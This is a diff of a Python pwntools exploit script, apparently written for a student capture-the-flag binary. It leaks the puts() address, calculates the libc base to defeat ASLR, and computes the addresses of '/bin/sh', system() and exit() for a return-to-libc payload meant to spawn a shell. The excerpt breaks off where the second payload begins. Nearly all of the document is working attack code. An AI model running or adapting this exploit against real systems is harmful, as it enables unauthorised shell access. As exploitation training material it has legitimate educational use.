@@ -3,7 +3,7 @@
 from pwn import *
 import binascii
 
-DEBUG = True
+DEBUG = False
 
 
 system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
@@ -42,7 +42,7 @@ if DEBUG:
     raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")
 
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
-print(r)
+print(r, '\n')
 
 p.sendline(payload1)
 
@@ -54,11 +54,14 @@ leak = leak[1:]  # slice off line-feed (0xa).
 # x/i 0x7ffff7e4be10
 # 0x7ffff7e4be10 <__GI__IO_puts>:      push   r14
 
-print("puts leak: ", binascii.b2a_hex(leak))
+print("puts leak:", binascii.b2a_hex(leak), end='')
+print(" (check with gdb> x/i 0x... or gdb gef> got)")
 
+
+#######
+# calculated without aslr:
 # gdb gef> info proc map
 # 0x7ffff7dd6000     0x7ffff7dfc000    0x26000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.33.so
-
 
 libc_start_noaslr = 0x7FFFF7DD6000
 leak = int.from_bytes(leak, byteorder="big", signed=False)
@@ -71,14 +74,38 @@ offset = leak - libc_start_noaslr
 # with aslr:
 # leak - 0x75e10 -> libc start
 
-print("offset:", hex(offset))
-libc_start = hex(leak - 0x75E10)
+#######
 
-print("libc start:", libc_start, end="")
+print("calculated offset:", hex(offset))
+libc_start = leak - 0x75E10
+
+print("libc start:", hex(libc_start), end="")
 print(" (compare with gdb> info proc map)")
 
+#######
+# calculated without aslr:
+
+# bin_sh_offset = int.from_bytes(bin_sh_string, byteorder="little", signed=False) - libc_start
+# system_offset = int.from_bytes(system_call, byteorder="little", signed=False) - libc_start
+# exit_offset = int.from_bytes(exit_call, byteorder="little", signed=False) - libc_start
+
+# print('/bin/sh offset from libc start:', hex(bin_sh_offset)) # 0x198882
+# print('system() offset from libc start:', hex(system_offset)) # 0x49860
+# print('exit_offset() offset from libc start:', hex(exit_offset)) # 0x3f100
+
+bin_sh_offset = 0x198882
+system_offset = 0x49860
+exit_offset = 0x3f100
+
+#######
+
+print('\ncalculated addresses:')
+print('/bin/sh:', hex(bin_sh_offset + libc_start), '(gdb> x/s 0x...)')
+print('system():', hex(system_offset + libc_start), '(gdb> x/i 0x...)')
+print('exit():', hex(exit_offset + libc_start), '(gdb> x/i 0x...)')
+
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
-print(r)
+print('\n', r)
 
 # this payload uses the calculated offset to pop a shell:
 payload2 = (
